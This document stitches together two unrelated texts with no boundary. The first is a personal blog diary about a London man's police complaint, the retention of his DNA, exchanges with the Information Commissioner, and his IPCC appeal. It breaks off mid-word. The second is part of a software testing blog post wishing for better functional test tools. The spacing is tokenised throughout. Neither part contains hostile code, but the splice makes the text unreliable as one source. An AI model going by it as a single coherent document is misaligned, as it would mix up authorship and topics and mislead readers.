The Detective Constable ( DC ) who arranged the meeting lets me in the restricted zone of the station .
We join the Detective Inspector ( DI ) in charge , who has also made the trip from Norbury , and leads the way to a small room .
Both are in plain clothes .
I sit across a table from them , take out my statement and exhibits .
They had apparently had a look at the draft I published earlier on this website .
The DC has in front of him a several centimetres - thick file , presumably related to my case .
The DI asks me if I keep publishing what 's happening on my website .
He then requests that I do not mention names of Police officers and that I do not write about the investigation while it is ongoing as it may be detrimental to its progress .
I agree to his requests .
The DI suggests again that I may want to opt for a local resolution instead of a full investigation .
I remain firm as I believe only a full investigation will have a chance to explain all the inconsistencies and inaccuracies of my case , identify any and all illegal actions of the Police and ensure it is visible enough so that other innocent Londoners may be spared similar treatment in similar circumstances .
The DI and DC go through the process and provide me with many explanations : e.g. , each identified officer will be sent a written notice ; they can provide a written reply ; if more information is needed they may be interviewed or a statement may be taken under caution .
The DI tries to lower my expectations ; for example , if their investigation finds my version of events incorrect I would have little chance of obtaining an apology .
He also queries whether I really want all the bullet points I included in my statement to be investigated .
I keep my statement as is but explain that I 'd expect them to be proportionate in their investigation and spend more time on the more damning issues .
I still have a right to appeal if I do not find the investigation report acceptable .
Guidance for such investigations suggest they are completed in 120 days starting from the date the complaint is received .
I did n't write down the start date mentioned in the discussion , but my complaint was received by the IPCC on 2006 - 05 - 31 and by the MPS on 2006 - 06 - 28 .
So it is likely that the investigation will be over by October .
I will be kept informed of progress on a monthly basis and the final report will be sent to the IPCC and myself .
As mentioned I will not report further on the investigation until after its conclusion .
Eventually I sign all the pages of my statement , give it to the DC who signs it as a witness and the meeting ends .
The DC had warned me the meeting could last up to four hours .
As I came with a prepared statement , I 'm out of the station by 1.40 pm !
Apparently LGC , a private company used by the Police to analyse DNA samples , has been building its own mini version of the national DNA database .
My DNA sample and or record may be held by this company and used without my consent .
My first reaction was to search the public register of data controllers for entries for LGC to find under which purpose they are keeping DNA records and the details of their data controller so that I could send yet another data subject access .
I found five entries for LGC and there 's also an entry for The Government Chemist , its old name .
However , none of these entries have a purpose that covers this DNA database .
I emailed the Information Commissioner to query whether LGC is in breach of the Data Protection Act and what should be my next move .
In my statement to the Police I wrote that one of my desired outcome is : ‘ 7 . All that the Police have on me that can be deleted and expunged , destroyed ( in particular the DNA samples and the PNC record ) .
’
Last week , the Detective Inspector reminded me that the Police delete DNA records only in exceptional cases and I should n't anticipate the exceptional to happen .
This is detailed in Appendix 2 of the ACPO 's Retention Guidelines for Nominal Records on the Police National Computer , which makes it clear that ‘ exceptional cases will by definition be rare ’.
This week 's revelations about what 's happening to DNA records captured for the Police shed new light on this part of my statement .
The Detective Sergeant ( DS ) conducting the investigation into my complaint agrees with the IPCC the terms of references for his investigation .
As detailed in a letter , these are a subset of the issues raised in my statement :
‘ Following a meeting with the IPCC yesterday , I am now in a position to update you with regards to the ' terms of reference ' for the investigation into your complaint . [...] we are unable to deal with every point raised in your statement and that in order to ensure that any inquiry is proportionate and timely we will concentrate our efforts on the main areas of concern .
With a view to this , please see the ' terms of reference ' below : - Terms of reference
To investigate the allegations made by Mr Mery with a view to proving or disproving the following : - That his stop , search and subsequent detention were an abuse of authority .
That he was not issued with a copy of the search record .
That the s.18 PACE search on his home address was an abuse of authority .
That statements made by the interviewing officer were incorrect and not supported by the facts .
That this investigation was not conducted in a professional manner .
Specifically that his property was retained for an extended period , for no good reason , he was not served with a bail cancellation notice until some time after the decision had been made to take no further action and that the Police National Computer was not updated in a timely manner . ’
Over the last couple of weeks I exchanged a few emails with casework and advice officers at the Information Commissioner 's Office ( ICO ) .
They explain that ‘ from the information available it appears that the LGC provides forensic services to the Police including DNA analysis .
As such it is likely that they would constitute a data processor under the Data Protection Act 1998 i.e. they only process personal data under instructions from a data controller which in this case will be the Police Force who has requested them to analyse a DNA sample .
As the LGC appears to be a data processor the responsibility for complying with the Data Protection Act 1998 would remain with the Police Force who took a DNA sample from you and it would be the Police Force 's register entry that would need to show they process DNA samples . ’
This means that if I have concerns about the retention of my DNA sample , which I obviously do , then I should raise it with the Police Force who took the sample .
As I explained to the ICO officer the difficulties I had and have to obtain information on what data the Police have on me , they recommend I follow the ICO complaint procedure .
I just sent a filled in form .
Documentation on when and how to complain as well as the needed forms are available on the ICO website .
An Information Commissioner 's Office ( ICO ) compliance officer sends a very detailed response to my data protection complaint :
‘[...]
I should first explain that almost all of the information processed by the police about members of the public is processed by them for the purposes of ' Policing ' .
This term covers essentially all the things they are empowered and instructed to do by law as a police force .
This includes conducting investigations , recording suspects ' details and maintaining criminal records on persons convicted .
DNA evidence obtained by the MPS from an individual will normally be processed by the force in accordance with the policing purpose .
The force is entitled to decide upon the ' weeding policy ' by which they choose to retain information .
The DNA information they keep cannot be reused for other incompatible purposes irrespective of whom they have decided to employ to look after it for them .
I would not consider there to be any more detailed information about your DNA sample likely to be retained by the force that they would be able to provide to you in any intelligible form .
Information gathered by the MPS for ' policing ' is - under the second Data Protection Principle - required to only be used for policing compatible purposes .
The Information Commissioner is aware of no evidence indicating that the MPS are inappropriately giving away DNA information to third parties or are allowing such information to be used for purposes incompatible with the police forces statutory functions .
[ my emphasis ]
The handling of the information processed in the name of the MPS does not have to be done solely by MPS staff .
The organisation may choose to employ outside IT contractors , private sector secure information disposal companies , private sector forensic laboratories , or even agency administrative staff .
The MPS do not have to obtain people 's information to employ such ' third parties ' to process personal data .
Such contractors fall within the legal definitions of data processors : data processors are in effect an employee of the data controller ( MPS ) .
The data controller is required to ensure its data processors process their information suitably securely and do not abuse the information .
The data controller does not however have to advise members of the public of their use of data processors nor seek permission for such use .
The MPS may employ data processors to work on their information on their behalf and in accordance with the purposes the MPS process the information themselves for , e.g. ' policing ' .
Organisations are not obliged to list their ' data processors ' on their Data Protection Register entry .
From the arrest information you have provided a copy it appears that the force keep DNA information in relation to you .
The information includes a DNA sample reference number .
The information can continue to be kept as long as it is in accordance with the MPS 's ' policing ' function and other law .
Irrespective of whom the MPS have employed to look after the information for them the information will still be the responsibility of the MPS to ensure its continued security . [... ]’
That clarifies the role of LGC and why I could n't find a relevant purpose in their public register of data controllers entries .
I am surprised by the statement I emphasised .
As it can be interpreted in several different ways I ask for clarifications :
[...]
You mention : " The Information Commissioner is aware of no evidence indicating that the MPS are inappropriately giving away DNA information to third parties or are allowing such information to be used for purposes incompatible with the police forces statutory functions . "
Does that mean that Information Commissioner considers the statements published [ by ]
The Observer and GeneWatch to be inaccurate , that none of these have been raised with him , or that it is an appropriate use ( which the rest of your reply clearly agrees that it is not ) ? [...]
Even though the compliance officer mentioned in his previous reply that the ICO is unable to assist me further at this time , he does send another detailed reply addressing to some extent my further requests :
‘ Within the information you have provided there was insufficient evidence for this office to take investigatory or enforcement action on the basis of your specific submission and regarding your personal information .
This is not to say however that the Information Commissioner is unaware of media reports or does not respond to them when he becomes aware of things .
It would be the responsibility of the Chief Officers of Police and the Home Office to ensure that the content of the Police National Computer , including DNA information , are not being reused for unauthorised purposes .
It would be the legal obligation of the Chief Police Officers to ensure they have an adequate contract in place with their contractors to prohibit abuse of the information . ’
I still do n't know if LGC has my DNA record and if it has what it is using it for .
Apparently the Information Commissioner cannot state clearly what he 's aware of and what is his response when it concern the potential misuse of my DNA – the most personal data of all – and that of many others .
I receive a letter from the Detective Sergeant ( DS ) conducting the investigation to inform me that it is close to conclusion ( I had n't had any news of the progress of the investigation into my IPCC - supervised complaint for close to three months . )
‘ The IPCC [...] will need to satisfy themselves that the terms of reference have been met before [ I can ] receive a copy of the final report . ’
The letter contains a few other details on the investigation but I promised not to write about the investigation while it is ongoing .
P.S. To my readers from the Internal Investigations Command , you may want to bookmark this page or remember that no page on this site ends in .htm .
P.P.S. Here 's a list of governmental , intelligence service and military organisations that have visited this site .
I receive a further letter from the Detective Sergeant ( DS ) conducting the investigation to let me know that :
‘[...] the investigation into your complaint is now complete .
Because the matter is supervised by the IPCC , I have forwarded a copy of the final report and supporting documents to them .
Once the findings have been confirmed you will be provided with a copy of the report . ’
The operational details from last month 's letter I did n't write about as the investigation was still ongoing , was that the DS had by then ‘ interviewed all 5 of the officers concerned and [ was ] waiting receipt of two further statements ’ .
Via GeneWatch , I discover Parliamentary answers that make it clear that if my circumstances are not considered exceptional enough , my DNA will be retained until my death : ‘A DNA sample is normally destroyed and the DNA profile derived from it is normally deleted from the national DNA database upon notification of the death of the individual concerned . ’
( My PNC record should be deleted when I become 100 years old . )
The Nuffield Council on Bioethics just started a consultation on the ethical issues in the forensic use of bioinformation , such as DNA sampling by the Police .
This is a way you can express your concerns .
I plan to do so .
According to figures received by Olly Kendall following a Freedom of Information Act ( FOI ) request , it looks like my arrest was one of ‘ 11 arrests [ in 2005 ] under legislation other than the Terrorism Act , where the investigation was conducted as a Terrorist Investigation ’ .
‘ 266 people were arrested under the Terrorism Act 2000 and Terrorism Act 2006 ’ during the same period .
‘ 187 [ other CJ arrestees were also ] released without charge ’ ; there 's no mention of how long they were detained or on bail .
There have been ‘ 8 Terrorism Act convictions to date ’ .
( It is unclear whether this data is for the calendar or the financial year 2005 . )
As mentioned in the entry two weeks ago , Andy Burnham ( Parliamentary Under - Secretary , Home Office ) stated in a written answer dated 18th April 2006 : ‘A DNA sample is normally destroyed and the DNA profile derived from it is normally deleted from the national DNA database upon notification of the death of the individual concerned . ’
The Association of Chief of Police Officers ( ACPO ) says otherwise in the DNA Good Practice Manual , Second Edition 2005 it published today :
‘ An Arrestee sample should be taken , using a PACE DNA sampling kit , from anyone who is detained at a police station and has been arrested for a recordable offence [...]
The profile will not be removed from the NDNAD after the death of the individual . ’
Either the retention period has been extended since last April – to eternity – or Andy Burnham or the ACPO is mistaken ?
So unless the Police exceptionally remove my DNA profile , it will survive me forever .
This arrest has a lasting effect .
The DNA Good Practice Manual also includes the following recommendation :
‘ The DNA page may show one of the following markers .
These indicate the status of any previous samples taken from the individual .
DC DNA confirmed - on the database and a conviction has been achieved DP DNA profiled - on the database DR DNA required - sample to be taken if the individual is in custody DT DNA taken - but not yet profiled DF DNA held in force - not submitted to a laboratory for analysis DS DNA rejected - DM DNA missing - sample not received DD DNA destroyed - [...]
It is essential to update the PNC as to the status of each DNA sample .
Some of the markers will be entered or changed by the force and others by the NDNAD .’
The information in my PNC record lists in the ‘ DNA REPORT SUMMARY ’ section : ‘ DNA STATUS : CONFIRMED ’ which according to the ACPO table above would indicate that ‘ a conviction has been achieved ’ contradicting reality and the listed details of the non conviction .
I 'll wait for the report from the enquiry into my complaint to see if the Police offer to delete this information before looking into getting it corrected .
The IPCC has confirmed the findings of the Police investigation and I should now expect to receive a copy of the report from the Police :
‘ As you are aware the IPCC has been supervising the investigation of your complaint of 17 April 2006 concerning the conduct of officers from the Metropolitan Police .
I am writing to confirm that the investigation has been completed .
The Commission has confirmed that the terms of reference for the investigation have been satisfied and as such the Commission 's supervisory responsibility is now at an end .
It is the responsibility of the police to inform you of the findings and outcome of the investigation .
You may be aware that you have the right to appeal to the IPCC on certain specified grounds if you are not satisfied with the investigation .
Those grounds are :
You have not been provided with adequate information about the findings of the investigation or the actions the police propose to take ( or not to take ) .
You have reasons to disagree with the findings of the investigation .
You have reasons to disagree with the action the police propose to take as a result of the investigation .
If you decide to take up this right , the appeal will be dealt with by a different Commissioner in another part of the country . ’
There 's one more step , I was n't aware of .
The Detective Sergeant ( DS ) conducting the investigation writes :
‘ You will now be aware that the IPCC have looked at my final report and are satisfied that the terms of reference have been met .
The report and supporting documents have now been passed to our misconduct office .
They are responsible for deciding how the matter should be resolved and what action , if any , should be taken against the officers who are subject to this investigation . ’
I call the Detective Sergeant ( DS ) conducting the investigation , the Detective Inspector ( DI ) answers .
He explains , they can't send me a copy of the report until the misconduct office finishes its work , but that they will send me the report at that point .
The misconduct office 's work apparently takes a few weeks , so I should expect to hear further from the Police at the end of January .
After many edits , I eventually submit my response to the consultation , conducted by the Nuffield Council on Bioethics , on the ethical issues in the forensic use of bioinformation .
I receive a copy of the Investigation Officer 's Report , dated 2006 - 11 - 02 , for the investigation following my complaint to the IPCC .
It is 18 - page long , protectively marked ‘ Restricted ’ and composed of an introduction , a summary of investigation , and conclusions and recommendations .
( So far I have n't been able to find out how the protective mark ‘ Restricted ’ limits what I can publish of the report . )
The report is accompanied by a cover letter dated 2007 - 01 - 17 written by the Inspector managing this case at the Misconduct Office ( I have anonymised all the names of the officers involved ) :
I refer to your complaint concerning Supt E , PC's R , T , DS Y and DS D and Inspector S , made to Southwark Police Station .
The investigation is now complete and I enclose for your information a copy of the Investigating officer 's report .
You will see that some parts of the report have been redacted , this is because the information is from police databases and is restricted .
I wish to draw to your attention to paragraphs 108- 119 of that report that concludes that there is no case to answer in relation to the stop and search and subsequent detention .
I disagree with that conclusion in respect of the arrest .
I agree that the stop and search were lawful under that Act but I believe the arrest was unlawful .
I agree with all the other conclusions in this report .
In relation to Superintendent E , he has retired from the Metropolitan police Service and no action can be taken against him under the Misconduct Regulations .
PC R appeared to follow instructions from Superintendent E concerning your arrest and it has been decided that he should receive words of advice .
code 5 performance of Duties .
PC
T failed to issue you personally with a copy of the stop and form [ sic ] ;
He is to receive words of advice .
Code 5 Performance of duties .
Inspector S authorised a search of your premises under S18 of the Police and Criminal Evidence Act 1984 , I agree that this search was unlawful .
He is to receive words of advice .
Code 4 Abuse of Authority .
DS Y carried out a search of your premises upon instructions from DS D.
It is agreed that nor [ sic ] further action will be taken in relation to him .
DS D failed to conduct this investigation in a professional manner and failed to obey orders from a senior officer .
He is to receive a written warning .
Code 5 Performance of Duties and Code 6 Lawful Orders .
A written warning will be placed on DS D's personal record for 12 months from the date that it is administered .
You have a right of appeal to the Independent Police Complaints Commission ( IPCC ) under the Police Reform Act 2002 .
The appeal process and how an appeal should be made are fully explained in the enclosed IPCC leaflet .
The appeal must be made in writing and will need to be made within 28 days of the date of this letter and sent to the Independent Police Complaints Commission , 90 High Holborn , London , WC1V 6BH .
Please be assured that the Metropolitan Police Service is committed to successfully resolving your complaint to your satisfaction .
If I can be of further assistance please contact me on the above telephone number .
I have until 2007 - 02 - 14 , to decide whether to accept the outcome or to make a written appeal to the IPCC .
I am interviewed for The Files , a Greek television news programme .
The filming is done in front of Southwark tube station .
Sophia Papaioannou , the reporter asks me to describe the arrest , its long lasting effects and then whether I consider CCTV useful ( the use of surveillance camera footage by the Greek Police is currently a controversial topic ) .
The show is aired on Tuesday 2007 - 02 - 06 on Mega TV .
The Section 44 Terrorism Act Standard Operating Procedures state that ‘ The National Joint Unit ( NJU ) must be informed of : [...] any person(s ) arrested under different legislation following a stop under the Terrorism Act 2000 ’ , which means there must be some information about me in the database the NJU is using , as well .
And this data may not be accurate or up - to - date .
The NJU was part of SO12 ( Anti-Terrorist Branch ) , which has been merged into the Counter Terrorism Command so this database must be maintained by the Metropolitan Police Service .
I email the Public Access Office of the MPS to ask for :
details of the data controller for the National Joint Unit database so that I can exercise my data subject access right ( or whether this database is exempt from the Data Protection Act )
the registration number (s ) or name (s ) under which the MPS data controller (s ) is registered under the Data Protection
Act as I can't find any entry for it any more in the ICO 's register of data controllers .
[ Follow up on this second question in the blog . ]
I eventually reach the conclusion that I have no option but to appeal .
Instead of writing the appeal in the provided form ( you do n't have to ) , I attach a letter .
This is the letter I brought to the IPCC on my way to work this morning ( I have anonymised the Inspector 's name , removed the references to the report and the cover letter , and added some hyperlinks ) :
I am writing to you to appeal the outcome of the IPCC - supervised enquiry into my complaint .
Inspector TT , Case Manager ( MPS DPS ) writes in her cover letter “ I agree that the stop and search were lawful under that Act but I believe the arrest was unlawful ” and “ I agree that this search was unlawful ” .
The arrest being unlawful , the subsequent taking of my fingerprints , palm prints and DNA samples were an assault on my person , the overnight detention was false imprisonment and the search of my flat was illegal .
Considering the seriousness of the Police actions and their long lasting effects , I have no option but to appeal for the outcome to include further actions :
Firstly , consistently with the desired outcome I included in my witness statement , I request the IPCC to demand from the Police :
They issue a formal and public apology for their actions .
For my fingerprint and palm print records , my DNA samples and my DNA profile in the NDNAD to all be physically destroyed or electronically deleted .
For the DNA and fingerprint summary information in the PNC to be deleted ( in the PNC extract dated 2006 - 02 - 28 I obtained under a data subject access , the DNA status is marked as “ confirmed ” which , according to the ACPO 's DNA Good Practice Manual , wrongfully implies “ conviction has been achieved ” ) .
For a copy of the stop and search form 5090 to be provided .
Secondly , I am concerned by paragraph 172 of the Investigating Officer 's Report dated 2006 - 11 - 02 , which states that there are no learning points for the Force .
Paragraph 116 includes “ he did not want this incident to escalate in the way that the incident at Stockwell tube station has ” .
If the Police sees only two options : arrest or the possibility that of a fatal shooting may occur , some lessons must be learnt to ensure that other options , such as release after the stop and search or after the search of premises or after interview , are given full consideration .
The report shows that at best there has been a great deal of confusion with misinformation and flawed intelligence exchanged between officers to the point where some officers believed my arrest was on suspicion of terrorism while others believed it was for causing public nuisance ( hoax ) , unclear responsibility for urgent processes such as getting CCTV tapes , and a lack of urgency and consideration in dealing with a cleared suspect ( even after the apparent sudden urgency caused by the publicity of the Guardian article ) .
Surely the Police can learn lessons to improve some of its policies and processes to hopefully ensure that similar cases are better handled in the future .
I understand that your office is extremely busy , so I have limited my appeal to what I consider are essential outcomes that have so far not been addressed .
An IPCC casework administrator sends a letter the same day :
Thank you for your appeal application of 09 February 2007 asking us to review the decision Metropolitan Police made regarding your complaint against them .
Should you have any further information or documentation in support of your appeal , please send it into me as soon as soon as possible so that it can be taken into consideration when reviewing your appeal .
Please note that the decision made by the IPCC about your appeal is final .
We will be writing to you about your application shortly .
I recently asked the Public Access Office about obtaining a copy of the information that should have been passed to the National Joint Unit ( NJU ) , when I was arrested , to check its accuracy .
Eventually , the Public Access Office passed on this request to SO15 ( Counter Terrorism Command ) where a Detective Inspector provided me with a helpful reply :
What you seem to be asking is this .
Did Southwark
Police notify the NJU of my arrest on the 28th July 2005 as the published police guidance suggests they should ?
And if so , can I have a copy of the report so that I check check its accuracy .
It is police guidance that says that the NJU should be informed , that is n't the law but simply internal Metropolitan Police policy which ought to be followed .
As will be obvious , our answer has to be that the material you request is exempted under the Act therefore it cannot be supplied whether it exists or not .
That said , in the context of your case if it helps to bring this e-mail exchange to an end , I can find no record to confirm that Southwark Police did submit a report to the NJU about your arrest .
As positive a news about what may have ended in their files I 'll ever be able to get .
This was preceded by a clear explanation of why exempting this specific kind of data from release is beneficial to our security :
Let me try to explain , if someone was to ask ' What information does the Counter Terrorism Command hold about me ? ' regardless of what that information was , it would almost always be exempt from release or confirmation under the DPA [ Data Protection Act ] or any other access route ( e.g. FOIA [ Freedom of Information Act ] ) .
You must realise that if information is gathered by the police it is ' for the purpose of the prevention and detection of crime , or in the case of this part of the police often relating to National Security ' .
The inevitable answer for this department is therefore to neither Confirm nor Deny whether we hold information .
Let me explain why -
If a group of men were planning a terrorist attack and they needed to know whether the police were looking at them , following your rationale , they could submit DPA requests and find out what the police held so that they can check that it is held in accordance with Data Protection principles .
If the police were to tell the applicant that they did n't hold anything , then the person would know they were n't being looked at .
If the police said we do hold something ( or provided something ) they would know that they were being looked at .
As you must realise we can't confirm this one way or the other .
That is why the exemptions are entered into the relevant Acts .
On 2005 - 11 - 28 , I met with Dan Kieran who interviewed me for his book I fought the law .
It is published today .
The chapter called Britain 's Ten Worst Laws , written in conjunction with civil rights campaign group Liberty , opens with this interview .
In other news , last time I called the IPCC , the caseworker said that my appeal would now be decided in weeks .
I receive a letter dated 2007 - 05 - 03 from the IPCC with its decision about my appeal :
This letter is about your appeal against the outcome of a police complaints investigation , which we received on 9 February 2007 .
After considering all the information available , I have now made a decision about the appeal .
I have not upheld your appeal .
The reasons for this decision are set out in the attached report .
This report sets out our decision against three different issues that , by law , we must consider when deciding on an appeal against a police investigation .
Despite the decision made , we have however requested that the Metropolitan Police Service reconsider your request for your records and samples to be physically destroyed and electronically deleted , and for the summary information in the Police National Computer to be expunged .
We have also informed the service that a copy of the Stop and Search form 5090 should be provided to you .
You should now expect the Metropolitan Police Service to contact you regarding the actions that I have asked them to take .
If you have any questions or need more information about this please contact me .
However , this decision is final .
This letter is accompanied by an 8 - page ' Appeal against investigation : Statement of findings ' report .
The next ste
In Part 1 , I discussed how Ward Cunningham , Brian Marick , and Jennitta Andrea ’s ideas have inspired me .
As I said in that post , their work has suggested possibilities to me .
No longer will I be satisfied with a test tool that just lets me drive an application .
I now want function test tools that represent tests graphically , execute tests from a variety of views , connect tests to code , and show me relationships between tests and features .
And being greedy , I want even more .
I want my test tool to understand enough about heuristics to suggest tests .
I want it to integrate tightly with source control so my tests can beversioned with the code .
I want it to work with continuous integration so my automated tests can be run as part of the continuous build process .
I want it to …
Well , here ’s my current list :
Support Various Graphical Representations
I want to express tests in whatever format makes the most sense for that type of test .
If I ’m testing a state - full system , I want to create a state model in a table or bubble chart , then associate expectations with each state and transition , like Brian ’s annotated assertions in his wireframes .
If I ’m testing business rules I want to create something like an entity - relationship diagram with expectations around conditions , constraints , and relationships between data elements .
If I ’m testing a process orworkflow I want to create something like Ward ’s swim lane representation , or an activity diagram with swim lanes , and annotate it with expectations around timing , order of events , error conditions , and responses .
Further , I want a test tool that can shift between code and pictures , the way Ward ’s Process Explorer does , and also allow me to create and update tests in both the graphical representation and the code view .
This suggests that the tool must support true round - trip editing : create a test in code , edit it in pictures ; create a test in pictures , edit it in code ; etc .
This also suggests that the test tool must have some understanding of states , transitions , entities , data elements , etc. so it can provide a mechanism to specify the actions and expectations associated with each .
Supply Available Test Actions
When creating / editing tests , I do n’t want to have to guess if I should refer to an action as “ login ” or “ log_in ” or “ enter_name_and_password . ”
If there ’s a test fixture that specifies available actions , the test tool should be able to prompt me with that list , intellisense style .
And that intellisense should work in both the code view and graphical view .
This implies that IDEs must understand tests as something like code .
And it may imply that test developers will end up using the same IDEs as code developers .
That would be fine with me .
Testers have had to deal with dumbed down pseudo IDEs from commercial tool vendors for far too long .
Give Business Users a Familiar - Feeling Editing Environment
FIT / FITnesse are brilliant in the way they support business users .
Developers write the test code ; domain experts write the tests .
The tool does n’t impose a one - size fits all view on the world .
Developers work in theirIDE ; domain experts work in HTML tables .
Similarly , I want the functional test tool to support business users adding and modifying tests in an environment that does n’t require them to get their geek on .
So while I just finished saying that a plugin for an IDE would be fine , I was n’t speaking the whole truth .
I think an IDE plugin would be fine for much of what I envision , but other editors will have to be allowed too .
Maybe , like FITnesse , the other editors could be web - based .
That ’s handy because it means nothing to install .
However , the graphical part is important .
Engineers love wikis ; business users do n’t love them quite as much .
They do n’t love WikiWords , they do n’t love hand crafting tables | with | pipes | delineating | cells , and they do n’t love having to remember the formatting symbols ( e.g. * bold * ) .
Business users use Excel and PowerPoint and Word .
Those are the interfaces they ’re used to .
I ’ve met plenty of domain expert testers who are terrified ofIDEs or anything resembling code .
These people have much to offer the project : they understand testing and they understand the domain .
The next generation of testing tools should allow them to collaborate , using an interface to express tests that feels as natural to them as using Word , Excel , or PowerPoint .
Prompt Additional Tests Based on Heuristics
AgitarOne from Agitar does something amazingly cool for unit testing : it dynamically generates tests based on known failure patterns .
We need something similar for functional test tools .
After all , functional testers use a wide range of heuristics in designing tests .
Some examples include selecting none , some , or all out of a set of available options .
Or having 0 , 1 , or many in a set of things , like search results .
Or positioning something ( like a cursor ) at the beginning , middle , or end .
For that matter , James Whittaker ’s book How to Break Software is an entire catalog of test heuristics .
Over the years there have been some attempts at this .
One was a commercial tool from Rational that , as far as I can tell , did n’t survive the merger with IBM .
Another was an application explorer that once shipped free with Segue ’s tool back when it was called Quality Works ( before the Silk days ) , and later became a commercial version for which they charged .
( I always found it ironic that the free version was better , at least in my opinion .
Of course it does n’t really matter since as far as I know , none of the versions are available these days .
But I digress . )
Now it ’s been a long time since I looked at either of those tools , but my recollection is that each fell short because they did both too little and too much .
Too little : the heuristics they understood were extremely limited .
I recall a lot of button clicking and boundary testing of fields .
Too much : they did n’t give me control .
( Actually , that ’s not true .
Segue ’s commercial product gave me a lot of control because it generated tests that I could then edit .
However , the generated tests were so verbose and so useless that it was n’t worth the effort to edit them . )
So , what I want is not yet another test code generator .
I do n’t want button - happy , mouse - clicking randomness .
I want the tool to suggest tests .
I want a little button , or a link , or or a right - mouse - context menu option , “ Suggest Related Tests , ” that will apply a wide variety of known heuristics to the current context and come up with a list that includes items like :
“ Select none of the items in the Choose Locations to Map select box ”
“ Select all of the items in the Choose Locations to Map select box ”
“ Clear optional field Description and save ”
“ Click browser back button ”
“ Logout while in Edit Profile state ”
It should then be easy to generate one or multiple tests , or at least the stubs for the tests .
If it ca n’t generate tests it should at least suggest tests based on the context , sort of like a “ hint ” button on a puzzle program .
( To give you some idea of the range of heuristics I ’m thinking about , here ’s the Test Heuristics Cheat Sheet I distributed in various classes over the last year .
And that ’s just a beginning . )
Support Model - Based Testing
A natural side effect of understanding graphical tests , understanding heuristics , and allowing me to specify expectations is that the tool should be able to support model - based testing .
That means that you should be able to specify a starting place , and the tool should be able to execute automatically and randomly generated tests until the cows come home , or until the application crashes so dramatically it ’s unrecoverable , whichever happens first .
( And for those of you who object to “ random ” tests , arguing that tests should be repeatable , I ’ll suggest that test repeatability is overrated . )
Allow Me to Specify the Essential ; Vary the Incidental
In any given test , there are things I care about — actions or data that are essential to the thing I want to test — and things I do n’t care about — incidental actions or data that do n’t really matter except that you have to choose something .
For example , if you ’re testing filling in addresses in a customer form , you might want to verify that you can enter Canadian postal codes ( e.g. “ M5H 3N5 ” ) .
You need the rest of the address , but you do n’t particularly care what it is .
In a real life example , I once tested a program that had a hot key combination for every menu option .
You would think that the hot key and the corresponding menu option would go through the same path in the code , right ?
So while we verified that the right screen came up when you pressed the hot key , we did n’t perform all our tests two times , once using the menu and once using the hot keys .
Late in the release cycle we discovered that in at least one instance our assumptions were incorrect .
The code behaved differently depending on how you navigated to a give screen .
The culprit , it turned out , was copied and pasted code .
That experience taught me to vary things , like navigation or data , even when I ’m not explicitly testing them .
And that ’s the kind of variation I want a test tool to support .
Integrate with Source Control
The tests and all associated artifacts should be in plain text , not a binary format .
This is necessary to support integration with source control , including merging and diffing .
Thus , while graphical representations are important , the emerging vision I see is a test tool that , at its heart , is driven by code even when showing the code in a graphical format .
And that code should be in the same code base as the code under test , labeled , branched , and versioned along with the rest of the code .
Execute Tests from Any View at Any Time
One of the incredible powers of FITnesse is that a business stakeholder can execute the automated tests from any computer with access to the FITnesse wiki with just the click of a mouse .
This capability means more than just being able to execute tests at any time .
It also means you do n’t have to have multiple artifacts to represent the same thing .
Consider FIT .
Executing tests defined in tables at any time is cool , but it ’s not particularly new .
People defined tests in tables for years before FIT came along .
So tables were n’t new .
Even executable tables were n’t all that new ; data driven testing using data from files has been around for quite a while .
But FIT was innovative because it allowed you to specify and execute your tests using the same artifact .
You did n’t specify your tests , then automate them , and end up with two representations of the same test to maintain .
Given an appropriate fixture , your test specification is executable from the minute you write it .
In fact , FIT and FITnesse support exploratory automation : automate a little , run the test , get ideas for new tests , specify those , run some more , etc .
That specify - and - execute - tests - anytime - anywhere capability gives stakeholders instant feedback about the state of the project relative to their expectations any time they want it .
Imagine the power of being able to draw a diagram with a set of expectations , then say “ Now , tell me which of these expectations are and are not met by the current version of the code . ”
That ’s what I want the next generation of test tools to do for me .
Support Dynamic Assembly of Test Suites
I want to be able to dynamically choose a set of tests to execute based on some criteria .
That set becomes a test suite .
Sometimes that criteria is an attribute of the test : it exercises some aspect of the system like database access or error handling .
Thus I want to be able to choose a set of tests by specifying an attribute , like “ actions include save ” or “ checks include error . ”
Sometimes that criteria is that the test is part of a set I ’ve designated as “ smoke tests ” or “ stress tests ” or “ happy path tests ” or somesuch .
Thus I want to be able to tag tests , and have those tags become an attribute of the tests : “ tags include smoke_test ” or “ tags include happy_path . ”
The end result of this should be that I can set up a continuous integration task to run all tests that should be included in a suite .
For example , I might have a task “ execute_functional_tests where tags include smoke_test ” or “ execute_functional_tests where last_result was fail . ”
Save Results
Each time I execute a test , the tool should automatically save a record of the results , including timing .
If I execute a suite , the tool should save a record of the suite criteria as well as the tests that were included .
I do n’t want these results to be versioned automatically , but I want the option of checking the results in .
Support Exploration
Ward ’s Process Explorer supports exploration by allowing you to see on - the - fly generated and formatted partial pages rendered by the server in response to an AJAX request .
I love that , and I want more things like it .
I want to be able to see what pages or dialog boxes look like within the context of a test by hovering a mouse over that point in a test .
Furthermore , I want to be able to drive the application under test to a good starting point for manual explorations with the click of the mouse .
So , for example , if I have a full state model , I ’d like to be able to drive the application under test to a given state , then begin manual exploration from there .
( Watir and Selenium , by the way , are good for this .
Because they drive Web applications through the browser , you can begin manually exploring wherever your automated tests leave off . )
Support True End - to - End Tests
Although you can write your FIT and FITnesse fixtures to test end - to - end , in practice developers usually write test fixtures to exercise the logic of the application , bypassing the UI , and using an in - memory database .
And yet , true end - to - end testing reveals information that logic testing alone cannot reveal .
It can tell you when the UI is not wired up correctly to the logic , it can tell you when the UI does n’t provide the expected feedback when a user provides data outside an allowed range , and it can tell you when there ’s a problem with the round trip from theUI to the database , then back to the UI again .
I will readily admit that automated end - to - end testing poses numerous challenges related to data and deployment .
Testing end - to - end means all the parts of the system are set up and ready for testing , in a known good state , and can be returned to that known good state at any time .
Just getting systems ready to test manually can be a challenge .
So there will be challenges associated with setting up and cleaning up data and configurations .
I do n’t expect a tool to doBippity - Boppity - Boo magic .
Rather , I expect the tool to create a structure around deployment that suggests ways to think about the problem to make it easier .
Here ’s one example of a way this might work .
Once upon a time I was testing a distributed system using Ruby and Watir .
Configuring all the parts of the system for testing was a real pain .
However , Ruby DRb provides a way of controlling distributed machines .
We used DRb to kick off Ruby setup scripts on the various machines involved in our end - to - end tests .
Our approach took quite a while to set up , in part because we had to think through all the various issues .
What if the functional test tool included small , lightweight , remote cross- platform - compatible listeners you could install on every box that needs to be configured ?
And what if those listeners understood how to access databases , set up files in file systems , change values in the Windows registry , set UNIX environment variables , etc .
